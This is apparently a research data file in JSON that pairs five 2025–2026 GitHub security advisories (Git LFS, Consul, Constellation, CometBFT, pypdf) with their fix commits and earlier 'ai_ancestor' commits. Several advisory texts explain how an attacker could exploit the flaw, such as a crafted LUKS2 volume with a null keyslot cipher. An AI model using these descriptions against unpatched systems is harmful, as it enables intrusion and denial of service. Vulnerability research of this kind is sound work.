+      "details": "### Impact\n\nWhen populating a Git repository's working tree with the contents of Git LFS objects, certain Git LFS commands may write to files visible outside the current Git working tree if symbolic or hard links exist which collide with the paths of files tracked by Git LFS.\n\nGit LFS has resolved this problem by revising the `git lfs checkout` and `git lfs pull` commands so that they check for symbolic links in the same manner as performed by Git before writing to files in the working tree.  These commands now also remove existing files in the working tree before writing new files in their place.\n\nAs well, Git LFS has resolved a problem whereby the `git lfs checkout` and `git lfs pull` commands, when run in a bare repository, could write to files visible outside the repository.  While a specific and relatively unlikely set of conditions were required for this to occur, it is no longer possible under any circumstances.\n\n### Patches\n\nThis problem exists in all versions since 0.5.2 and is patched in v3.7.1.  All users should upgrade to v3.7.1.\n\n### Workarounds\n\nSupport for symlinks in Git may be disabled by setting the `core.symlinks` configuration option to `false`, after which further clones and fetches will not create symbolic links.  However, any symbolic or hard links in existing repositories will still provide the opportunity for Git LFS to write to their targets.\n\n### References\n\n- https://github.com/git-lfs/git-lfs/security/advisories/GHSA-6pvw-g552-53c5\n- https://nvd.nist.gov/vuln/detail/CVE-2025-26625\n- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-26625\n- https://github.com/git-lfs/git-lfs/releases/tag/v3.7.1\n- [git-lfs/git-lfs@5c11ffce9a](https://github.com/git-lfs/git-lfs/commit/5c11ffce9a4f095ff356bc781e2a031abb46c1a8)\n- [git-lfs/git-lfs@0cffe93176",
+      "severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N"
+        }
+      ],
+      "withdrawn_at": null,
+      "aliases": [
+        "CVE-2025-26625"
+      ],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-59"
+        ],
+        "github_reviewed": true,
+        "nvd_published_at": "2025-10-17T16:15:37Z"
+      },
+      "affected_packages": [
+        {
+          "name": "github.com/git-lfs/git-lfs",
+          "ecosystem": "Go"
+        }
+      ],
+      "refs": [
+        "https://github.com/git-lfs/git-lfs/security/advisories/GHSA-6pvw-g552-53c5",
+        "https://nvd.nist.gov/vuln/detail/CVE-2025-26625",
+        "https://github.com/git-lfs/git-lfs/commit/0cffe93176b870055c9dadbb3cc9a4a440e98396",
+        "https://github.com/git-lfs/git-lfs/commit/5c11ffce9a4f095ff356bc781e2a031abb46c1a8",
+        "https://github.com/git-lfs/git-lfs/commit/d02bd13f02ef76f6807581cd6b34709069cb3615",
+        "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-26625",
+        "https://github.com/git-lfs/git-lfs",
+        "https://github.com/git-lfs/git-lfs/releases/tag/v3.7.1",
+        "https://lists.debian.org/debian-lts-announce/2026/05/msg00055.html"
+      ]
+    },
+    "commit_pool": "/home/hanqing/.cache/ghsa200-sweep-fetch/git-lfs__git-lfs",
+    "pool_exists": true,
+    "ancestor_type": "commit",
+    "fix_type": "commit",
+    "ancestor_msg": "4b25800ecc81089765f14416637ee396da2d586f\n7a86d13d64ae69ea760cc96f0cfd01acee2fc46a\nt: add shell tests with pointer extension program\n\nIn PR #486 we introduced support for Git LFS pointer extensions, along\nwith some related tests in our Go test suite and the t/t-ext.sh shell\ntest script, which validates that pointer extensions are reported as\nexpected by the \"git lfs ext\" command.  (Note that Git LFS pointer\nextension support is still technically considered experimental,\naccording to our documentation.)\n\nHowever, we do not have any tests which exercise a complete Git LFS\npointer extension configuration including an extension program which\ntransforms the content of files tracked as Git LFS objects.\n\nWe therefore add a new lfstest-caseinverterextension test utility\nprogram and make use of it in a set of shell tests of our \"git lfs clean\",\n\"git lfs smudge\", and \"git lfs filter-process\" commands, as well as\nin tests of our \"git lfs checkout\" and \"git lfs pull\" commands.  All\nof these commands execute the lfstest-caseinverterextension utility\nand confirm that it runs as expected.\n\nNote that at present, when we execute a pointer extension program within\none of our \"git lfs clean\", \"git lfs smudge\", and \"git lfs filter-process\"\ncommands, our commands have typically inherited their execution\nenvironment from Git.  When Git runs one of these commands to perform\na \"clean\" or \"smudge\" filter operation, it has already changed the current\nworking directory to be the root of the repository's working tree.  The\nsetup_git_directory_gently() function in Git is normally run shortly\nafter starting, and if it detects that the current working directory\nis within a Git work tree, it changes the current working directory to\nthe root of that work tree:\n\n  https://github.com/git/git/blob/v2.50.1/setup.c#L1758-L1760\n\nThe file paths Git then passes to our filter commands are always relative\nto the root of the repository.  Git passes these file paths in place of\nthe \"%f\" command-line specifier from the filter configuration options, and\nfor long-running filter processes such as our \"git lfs filter-process\"\ncommand, Git passes an equivalent file path as the value of the \"pathname\"\nkeys it sends to the filter process.  The gitattributes(5) manual page\nnotes that files may not actually exist at these file paths, or may have\ndifferent contents than the ones Git pipes to the filter process, and so\nfilter programs should not attempt to access files at these paths:\n\n  https://github.com/git/git/blob/v2.50.1/Documentation/gitattributes.adoc?plain=1#L503-L507\n\nLikewise, when the Git LFS client invokes a Git LFS pointer extension\nprogram, it passes a file path in place of any \"%f\" command-line\nspecifier in the extension configuration options, while piping the\nactual file contents to the program on the standard input file\ndescriptor.  If the client itself has been run by Git as a filter program,\nthen the file path will be relative to the root of the repository, and\nthe current working di",
+    "fix_msg": "0cffe93176b870055c9dadbb3cc9a4a440e98396\ne735de58a72f1333a16054985b85b863fbaec138\ncheck for dir/symlink conflicts on checkout/pull\n\nOur \"git lfs checkout\" and \"git lfs pull\" commands, at present,\nfollow any extant symbolic links when they populate the current working\ntree with files containing the content of Git LFS objects, even if\nthe symbolic links point to locations outside of the working tree.\nThis vulnerability has been assigned the identifier CVE-2025-26625.\n\nIn previous commits we partially addressed this vulnerability by\nensuring that the \"git lfs checkout\" and \"git lfs pull\" commands remove\nany file or symbolic link which already exists at the location where\nthey intend to write the contents of a Git LFS file, and by checking for\nsymbolic links at these locations first in the DecodePointerFromBlob()\nfunction of the \"lfs\" package.\n\nHowever, these changes still allow for the possibility that a symbolic\nlink exists in place of a directory in the path between the root of\nthe working tree and the location where the commands intend to create\na file.  At present, the \"git lfs checkout\" and \"git lfs pull\" commands\nwill not detect such links, and so may be induced to write to a location\noutside of the working tree.\n\nTo address this issue, revise the \"git lfs checkout\" and \"git lfs pull\"\ncommands so they check each path component from the root of the working\ntree to a Git LFS file.  If any are missing, a directory is created, and\nif any already exist but are not directories, the commands report an\nerror and do not try to create the Git LFS file or write to it.\n\nIn our implementation of these checks, we adopt a similar approach to\nthe one used by Git, which also tries to avoid accidentally traversing\nsymbolic links when updating the files in a working tree.  For\nperformance and compatibility reasons, though, Git does not try to\ncompletely eliminate all TOCTOU (time-of-check/time-of-use) races\ninvolving symbolic links.\n\nLikewise, we do not aim to prevent every possible race which might\nallow the Git LFS client to unintentionally write through a symbolic\nlink.  Instead, we try to limit the chances of this occurring as far as\nwe reasonably can, while avoiding significant performance penalties.\n\nOne difference between our approach and that taken by Git is that\nwhen the we check whether a directory exists and find something other\nthan a directory, we do not try to remove it.  This design choice\nretains compatibility with the legacy behaviour of the Git LFS client,\nwhich simply invoked the MkdirAll() function of the \"os\" package in\nthe Go standard library.  That function returns an error if any of the\ndirectories in the given path do not already exist and cannot be created,\nand the \"git lfs checkout\" and \"git lfs pull\" commands would just report\nthat error rather than attempt to resolve it by removing anything.\n\nAnother difference between the way Git checks for directory path\nconflicts and the implementation we introduce in this commit is that\nGit retai",
+    "is_ancestor": true,
+    "ai_marker": [],
+    "ancestor_parents": [
+      "7a86d13d64ae69ea760cc96f0cfd01acee2fc46a"
+    ],
+    "fix_parents": [
+      "e735de58a72f1333a16054985b85b863fbaec138"
+    ]
+  },
+  {
+    "case_id": "GHSA-7G3R-8C6V-HFMR",
+    "repository": "hashicorp/consul",
+    "fix_ref": "72a358cd02533477536ad4bd2b781f520fa7fac6",
+    "ai_ancestor": "5259495ae77d39209f669e1fef211348922481d4",
+    "subject": "removed regex for kv keys and added validations to mitigate CVE-2025-11392 (#22850)",
+    "published": "2025-10-28T21:30:33Z",
+    "overlap_files": [
+      "agent/kvs_endpoint.go",
+      "agent/kvs_endpoint_test.go"
+    ],
+    "advisory_json": "/home/hanqing/.cache/ghsa200-worker-clones/commit-oz/advisory-database/advisories/github-reviewed/2025/10/GHSA-7g3r-8c6v-hfmr/GHSA-7g3r-8c6v-hfmr.json",
+    "advisory": {
+      "id": "GHSA-7g3r-8c6v-hfmr",
+      "summary": "Consul key/value endpoint is vulnerable to denial of service",
+      "details": "Consul and Consul Enterprise\u2019s (\u201cConsul\u201d) key/value endpoint is vulnerable to denial of service (DoS) due to incorrect Content Length header validation. This vulnerability, CVE-2025-11374, is fixed in Consul Community Edition 1.22.0 and Consul Enterprise 1.22.0, 1.21.6, 1.20.8 and 1.18.12.",
+      "severity": [
+        {
+          "type": "CVSS_V3",
+          "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"
+        }
+      ],
+      "withdrawn_at": null,
+      "aliases": [
+        "CVE-2025-11374"
+      ],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-770"
+        ],
+        "github_reviewed": true,
+        "nvd_published_at": "2025-10-28T21:15:37Z"
+      },
+      "affected_packages": [
+        {
+          "name": "github.com/hashicorp/consul",
+          "ecosystem": "Go"
+        }
+      ],
+      "refs": [
+        "https://nvd.nist.gov/vuln/detail/CVE-2025-11374",
+        "https://github.com/hashicorp/consul/pull/22916",
+        "https://github.com/hashicorp/consul/commit/72a358cd02533477536ad4bd2b781f520fa7fac6",
+        "https://discuss.hashicorp.com/t/hcsec-2025-29-consuls-kv-endpoint-is-vulnerable-to-denial-of-service/76724",
+        "https://github.com/hashicorp/consul",
+        "https://github.com/hashicorp/consul/releases/tag/v1.22.0",
+        "https://pkg.go.dev/vuln/GO-2025-4081"
+      ]
+    },
+    "commit_pool": "/home/hanqing/.cache/ghsa200-sweep-fetch/hashicorp__consul",
+    "pool_exists": true,
+    "ancestor_type": "commit",
+    "fix_type": "commit",
+    "ancestor_msg": "5259495ae77d39209f669e1fef211348922481d4\ne794201d0c618333d81ad775270f7b32801178fb\nremoved regex for kv keys and added validations to mitigate CVE-2025-11392 (#22850)\n\n* updated kvKeyPattern\n\n* add changelog\n\n* Update agent/kvs_endpoint.go to include \u00e7 in allowed chars\n\nCo-authored-by: Deniz Onur Duzgun <59659739+dduzgun-security@users.noreply.github.com>\n\n* Update changelog 22850.txt\n\n* Update kvs_endpoint_test.go to add \u00e7 in allowed chars\n\n* Update agent/kvs_endpoint_test.go\n\nCo-authored-by: Deniz Onur Duzgun <59659739+dduzgun-security@users.noreply.github.com>\n\n* fix: rework kv key name validation (#22863)\n\n* remove: restrictive regex while keeping necessary security validations\n\n* Update agent/kvs_endpoint_test.go\n\nCo-authored-by: Will Owens <ghthor@gmail.com>\n\n* add: disablekvkeyvalidation option\n\n* add warning on non-standard keys if DisableKVKeyValidation set to true\n\n---------\n\nCo-authored-by: Will Owens <ghthor@gmail.com>\n\n* updated warnings to be shown to users\n\n* Update .changelog/22850.txt\n\nCo-authored-by: Deniz Onur Duzgun <59659739+dduzgun-security@users.noreply.github.com>\n\n* Update .changelog/22850.txt\n\nCo-authored-by: Deniz Onur Duzgun <59659739+dduzgun-security@users.noreply.github.com>\n\n* updated doc\n\n* Update .changelog/22850.txt\n\nCo-authored-by: Will Owens <ghthor@gmail.com>\n\n* Update website/content/docs/reference/agent/configuration-file/general.mdx\n\nCo-authored-by: Jeff Boruszak <104028618+boruszak@users.noreply.github.com>\n\n* Update website/content/docs/automate/kv/store.mdx\n\nCo-authored-by: Jeff Boruszak <104028618+boruszak@users.noreply.github.com>\n\n---------\n\nCo-authored-by: Deniz Onur Duzgun <59659739+dduzgun-security@users.noreply.github.com>\nCo-authored-by: Will Owens <ghthor@gmail.com>\nCo-authored-by: Jeff Boruszak <104028618+boruszak@users.noreply.github.com>\n",
+    "fix_msg": "72a358cd02533477536ad4bd2b781f520fa7fac6\ne285476115286c2aee2a196f638ae1e1f1848c18\nSECVULN-29092 DoS handled for kvs_endpoint.go (#22916)\n\n\n",
+    "is_ancestor": true,
+    "ai_marker": [],
+    "ancestor_parents": [
+      "e794201d0c618333d81ad775270f7b32801178fb"
+    ],
+    "fix_parents": [
+      "e285476115286c2aee2a196f638ae1e1f1848c18"
+    ]
+  },
+  {
+    "case_id": "GHSA-HQ76-6GH2-5G4Q",
+    "repository": "edgelesssys/constellation",
+    "fix_ref": "bb8d2c8a5c0a0a6510d2cc43055be21f4a3ab83c",
+    "ai_ancestor": "23fa3bb36ea14462b22f456937b9bb47f87af5e0",
+    "subject": "deps: update module k8s.io/kubernetes to v1.33.4 [SECURITY] (#3931)",
+    "published": "2025-10-27T16:20:25Z",
+    "overlap_files": [
+      "go.mod",
+      "go.sum"
+    ],
+    "advisory_json": "/home/hanqing/.cache/ghsa200-worker-clones/commit-oz/advisory-database/advisories/github-reviewed/2025/10/GHSA-hq76-6gh2-5g4q/GHSA-hq76-6gh2-5g4q.json",
+    "advisory": {
+      "id": "GHSA-hq76-6gh2-5g4q",
+      "summary": "Constellation has insecure LUKS2 persistent storage partitions which may be opened and used",
+      "details": "### Summary\nA malicious host may provide a crafted LUKS2 volume to a confidential computing guest that is using the [OpenCryptDevice](https://github.com/edgelesssys/constellation/blob/6eff250f16f8ae48221d412550e4a64a4bf0d77b/csi/cryptmapper/cryptmapper.go#L89) feature. The guest will open the volume and write secret data using a volume key known to the attacker. The attacker can also pre-load data on the device, which could potentially compromise guest execution.\n\n\nLUKS2 volume metadata is not authenticated and supports null key-encryption algorithms, allowing an attacker to create a volume such that the volume:\n- Opens (cryptsetup open) without error using any passphrase or token\n- Records all writes in plaintext (or ciphertext with an attacker-known key)\n- Contains arbitrary data chosen by the attacker\n\n\n### Details\nThe Constellation CVM image uses LUKS2-encrypted volumes for persistent storage. When opening an encrypted storage device, the CVM uses the `libcryptsetup`  function [crypt_activate_by_passhrase](https://github.com/martinjungblut/go-cryptsetup/blob/fd0874fd07a6e477f0a4d18f2e80234983afe74f/device.go#L261). If the VM is successful in opening the partition with the disk encryption key, it treats the volume as confidential. However, due to the unsafe handling of null keyslot algorithms in the cryptsetup 2.8.1,  it is possible that the opened volume is not encrypted at all.\n\nCryptsetup prior to version 2.8.1 does not report an error when processing LUKS2-formatted disks that use the `cipher_null-ecb` algorithm in the keyslot `encryption` field.\n\n### Impact\n\nA LUKS2 disk encrypted with a master key, which is in turn encrypted with user passwords stored in some number of keyslots. By creating a malicious disk which sets the keyslot encryption algorithm to `\u201dcrypt",
+      "severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:L/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X"
+        }
+      ],
+      "withdrawn_at": null,
+      "aliases": [
+        "CVE-2025-58356"
+      ],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-347",
+          "CWE-552"
+        ],
+        "github_reviewed": true,
+        "nvd_published_at": "2025-10-27T20:15:53Z"
+      },
+      "affected_packages": [
+        {
+          "name": "github.com/edgelesssys/constellation/v2",
+          "ecosystem": "Go"
+        }
+      ],
+      "refs": [
+        "https://github.com/edgelesssys/constellation/security/advisories/GHSA-hq76-6gh2-5g4q",
+        "https://nvd.nist.gov/vuln/detail/CVE-2025-58356",
+        "https://github.com/edgelesssys/constellation/pull/3927",
+        "https://github.com/edgelesssys/constellation/commit/bb8d2c8a5c0a0a6510d2cc43055be21f4a3ab83c",
+        "https://blog.trailofbits.com/2025/10/30/vulnerabilities-in-luks2-disk-encryption-for-confidential-vms",
+        "https://github.com/edgelesssys/constellation",
+        "https://github.com/edgelesssys/constellation/releases/tag/v2.24.0"
+      ]
+    },
+    "commit_pool": "/home/hanqing/.cache/ghsa200-sweep-fetch/edgelesssys__constellation",
+    "pool_exists": true,
+    "ancestor_type": "commit",
+    "fix_type": "commit",
+    "ancestor_msg": "23fa3bb36ea14462b22f456937b9bb47f87af5e0\ne2e94bcf7d7a85b0e65b87202f14f634b01f5db3\ndeps: update module k8s.io/kubernetes to v1.33.4 [SECURITY] (#3931)\n\nCo-authored-by: renovate[bot] <29139614+renovate[bot]@users.noreply.github.com>\n",
+    "fix_msg": "bb8d2c8a5c0a0a6510d2cc43055be21f4a3ab83c\n23fa3bb36ea14462b22f456937b9bb47f87af5e0\ncryptsetup: enable detached header (#3927)\n\n* deps: update go-cryptsetup\n* cryptsetup: use detached headers when opening existing crypt devices\n* cryptsetup: only activate disks with detached header\n\n---------\n\nSigned-off-by: Daniel Wei\u00dfe <dw@edgeless.systems>\n",
+    "is_ancestor": true,
+    "ai_marker": [],
+    "ancestor_parents": [
+      "e2e94bcf7d7a85b0e65b87202f14f634b01f5db3"
+    ],
+    "fix_parents": [
+      "23fa3bb36ea14462b22f456937b9bb47f87af5e0"
+    ]
+  },
+  {
+    "case_id": "GHSA-HRHF-2VCR-GHCH",
+    "repository": "cometbft/cometbft",
+    "fix_ref": "be5677c3e58f998b7f67bb6186dd2c9b81a041a1",
+    "ai_ancestor": "2cd5d91d9db3fc9f4628b1a8e7af54e724f37538",
+    "subject": "fix(consensus/reactor): reject oversized proposals (backport #5324) (#5407)",
+    "published": "2025-10-14T19:57:30Z",
+    "overlap_files": [
+      "CHANGELOG.md",
+      "consensus/reactor.go"
+    ],
+    "advisory_json": "/home/hanqing/.cache/ghsa200-worker-clones/commit-oz/advisory-database/advisories/github-reviewed/2025/10/GHSA-hrhf-2vcr-ghch/GHSA-hrhf-2vcr-ghch.json",
+    "advisory": {
+      "id": "GHSA-hrhf-2vcr-ghch",
+      "summary": "CometBFT's invalid BitArray handling can lead to network halt",
+      "details": "Name: ASA-2025-003: Invalid BitArray handling can lead to network halt\nCriticality: High (Considerable Impact; Possible Likelihood per [ACMv1.2](https://github.com/interchainio/security/blob/main/resources/CLASSIFICATION_MATRIX.md))\nAffected versions: `<= v0.38.18`, `<= v0.37.15`, and `main` development branches\nAffected users: Validators, Full nodes, Users\n\n### Description\n\nA bug was discovered in CometBFT's handling of `BitArray`'s that have a mismatch between the `BitArray`'s expected number of `Elems` for the specified number of `Bits`. Additional validation was added to prevent processing `BitArray`'s in this invalid state, as well as guards to prevent panics on `BitArray` methods if one of these invalid states is processed.\n\n### Impact\n`BitArray`'s are present in a number of messages received from peers. When handling these messages, insufficient validation was applied to prevent processing messages the aforementioned invalid state. In the worst case, nodes will gossip messages to peers in an invalid state before processing them themselves, leading to a network halt (instead of only the node receiving the malicious message crashing). \n\n### Patches\n\nThe new CometBFT releases [v0.38.19](https://github.com/cometbft/cometbft/releases/tag/v0.38.19) and [v0.37.16](https://github.com/cometbft/cometbft/releases/tag/v0.37.16) fix this issue.\n\nUnreleased code in the main branch is patched as well.\n\n### Workarounds\n\nIf a node is able to identify a malicious peer sending these payloads, they can ban the ip address using common tools like `iptables`.\n\n### Timeline\n\n* October 3, 2025, 11:26am EST: Issue reported to Cosmos Labs via an external team (via their Bug Bounty Program).\n* October 3, 2025, 11:59am EST: Issue triaged by core team and core team completes validation of iss",
+      "severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N"
+        }
+      ],
+      "withdrawn_at": null,
+      "aliases": [],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-228"
+        ],
+        "github_reviewed": true,
+        "nvd_published_at": null
+      },
+      "affected_packages": [
+        {
+          "name": "github.com/cometbft/cometbft",
+          "ecosystem": "Go"
+        },
+        {
+          "name": "github.com/cometbft/cometbft",
+          "ecosystem": "Go"
+        }
+      ],
+      "refs": [
+        "https://github.com/cometbft/cometbft/security/advisories/GHSA-hrhf-2vcr-ghch",
+        "https://github.com/cometbft/cometbft/commit/be5677c3e58f998b7f67bb6186dd2c9b81a041a1",
+        "https://github.com/cometbft/cometbft/commit/dcb1f265b59477be40804f7ccdc4fb30612d6a4f",
+        "https://github.com/cometbft/cometbft",
+        "https://github.com/cometbft/cometbft/releases/tag/v0.37.16",
+        "https://github.com/cometbft/cometbft/releases/tag/v0.38.19"
+      ]
+    },
+    "commit_pool": "/home/hanqing/.cache/ghsa200-sweep-fetch/cometbft__cometbft",
+    "pool_exists": true,
+    "ancestor_type": "commit",
+    "fix_type": "commit",
+    "ancestor_msg": "2cd5d91d9db3fc9f4628b1a8e7af54e724f37538\nbb538f0c8166ed892f01fef11e367c161cf25ef2\nfix(consensus/reactor): reject oversized proposals (backport #5324) (#5407)\n\n---\nUpdates the consensus reactor to validate that a received proposal will\nnot contain more parts than the amount of chunks that it would take to\nbuild a block whos size is equal to `ConsensusParams.Block.MaxBytes`.\n\nOriginal PR is here https://github.com/cometbft/cometbft/pull/5309, but\nreopened since the contributor stopped replying.\n\n#### PR checklist\n\n- [ ] Tests written/updated\n- [ ] Changelog entry added in `.changelog` (we use\n[unclog](https://github.com/informalsystems/unclog) to manage our\nchangelog)\n- [ ] Updated relevant documentation (`docs/` or `spec/`) and code\ncomments\n<hr>This is an automatic backport of pull request #5324 done by\n[Mergify](https://mergify.com).\n\nCo-authored-by: Alex | Interchain Labs <alex@cosmoslabs.io>\nCo-authored-by: arsushi <richie@asymmetric.re>\nCo-authored-by: Abdul Malek <me@almk.dev>\nCo-authored-by: Matt Acciai <matt@skip.money>\nCo-authored-by: mergify[bot] <37929162+mergify[bot]@users.noreply.github.com>\nCo-authored-by: Tyler <48813565+technicallyty@users.noreply.github.com>\nCo-authored-by: maradini77 <140460067+maradini77@users.noreply.github.com>\n",
+    "fix_msg": "be5677c3e58f998b7f67bb6186dd2c9b81a041a1\n2cd5d91d9db3fc9f4628b1a8e7af54e724f37538\nMerge commit from fork\n\n* add VaidateBasic to BitArray to ensure Bits and len(Elems) are valid\n\n* call ValidateBasic on BitArrays when receiving as a msg from exteranl nodes\n\n* enfore SetIndex is not setting out of bounds\n\n* add guard to getNumTrueIndices\n\ngetNumTrueIndices will index out of bounds if Bits and Elems have a\nmismatch where len(elems) != (bits+63)/64, this guard makes it simply\nreturn 0 if this mismatch is present\n\n* changelog\n\n* fix missing import for v0.38.x\n\n* update changelog for release of v0.38.19\n\n* remove duplicate bug fixes from unreleased\n\n* fix changelog date\n\n* fix lint\n\n* fix expected error string in test\n",
+    "is_ancestor": true,
+    "ai_marker": [],
+    "ancestor_parents": [
+      "bb538f0c8166ed892f01fef11e367c161cf25ef2"
+    ],
+    "fix_parents": [
+      "2cd5d91d9db3fc9f4628b1a8e7af54e724f37538"
+    ]
+  },
+  {
+    "case_id": "GHSA-5QJQ-93H5-HRGP",
+    "repository": "py-pdf/pypdf",
+    "fix_ref": "c64583be16b8e8763d8777075f8ecbf382014b7a",
+    "ai_ancestor": "c11bf57bc22dd69295b95cacbf132c070443805b",
+    "subject": "MAINT: Rename two variables (#3873)",
+    "published": "2026-07-23T15:06:58Z",
+    "overlap_files": [
+      "pypdf/generic/_image_xobject.py",
+      "tests/generic/test_image_xobject.py"
+    ],
+    "advisory_json": "/home/hanqing/.cache/ghsa200-worker-clones/commit-oz/advisory-database/advisories/github-reviewed/2026/07/GHSA-5qjq-93h5-hrgp/GHSA-5qjq-93h5-hrgp.json",
+    "advisory": {
+      "id": "GHSA-5qjq-93h5-hrgp",
+      "summary": "pypdf: Possible large memory usage for wrong image dimensions",
+      "details": "### Impact\n\nAn attacker who uses this vulnerability can craft a PDF which leads to large memory usage. This requires loading images where the declared size values are much too large compared to the actual data.\n\n### Patches\n\nThis has been fixed in [pypdf==6.14.0](https://github.com/py-pdf/pypdf/releases/tag/6.14.0).\n\n### Workarounds\n\nIf you cannot upgrade yet, consider applying the changes from PR [#3888](https://github.com/py-pdf/pypdf/pull/3888).",
+      "severity": [
+        {
+          "type": "CVSS_V4",
+          "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N"
+        }
+      ],
+      "withdrawn_at": null,
+      "aliases": [
+        "CVE-2026-59938"
+      ],
+      "database_specific": {
+        "cwe_ids": [
+          "CWE-789"
+        ],
+        "github_reviewed": true,
+        "nvd_published_at": "2026-07-08T18:16:35Z"
+      },
+      "affected_packages": [
+        {
+          "name": "pypdf",
+          "ecosystem": "PyPI"
+        }
+      ],
+      "refs": [
+        "https://github.com/py-pdf/pypdf/security/advisories/GHSA-5qjq-93h5-hrgp",
+        "https://nvd.nist.gov/vuln/detail/CVE-2026-59938",
+        "https://github.com/py-pdf/pypdf/pull/3888",
+        "https://github.com/py-pdf/pypdf/commit/c64583be16b8e8763d8777075f8ecbf382014b7a",
+        "https://github.com/py-pdf/pypdf",
+        "https://github.com/py-pdf/pypdf/releases/tag/6.14.0"
+      ]
+    },
+    "commit_pool": "/home/hanqing/.cache/ghsa200-sweep-fetch/py-pdf__pypdf",
+    "pool_exists": true,
+    "ancestor_type": "commit",
+    "fix_type": "commit",
+    "ancestor_msg": "c11bf57bc22dd69295b95cacbf132c070443805b\n4e827fda465a0cd1e08c1cbda52ce0583860c0b9\nMAINT: Rename two variables (#3873)\n\nShorter names with same meaning for better readability.\n\n---------\n\nCo-authored-by: Stefan <96178532+stefan6419846@users.noreply.github.com>\n",
+    "fix_msg": "c64583be16b8e8763d8777075f8ecbf382014b7a\nb5fc5aa714f4b696fb9b1deaa35a9e4a4eb50dae\nSEC: Apply general limit for requested image size (#3888)\n\n\n",
+    "is_ancestor": true,
+    "ai_marker": [],
+    "ancestor_parents": [
+      "4e827fda465a0cd1e08c1cbda52ce0583860c0b9"
+    ],
+    "fix_parents": [
+      "b5fc5aa714f4b696fb9b1deaa35a9e4a4eb50dae"
+    ]
+  }
+]
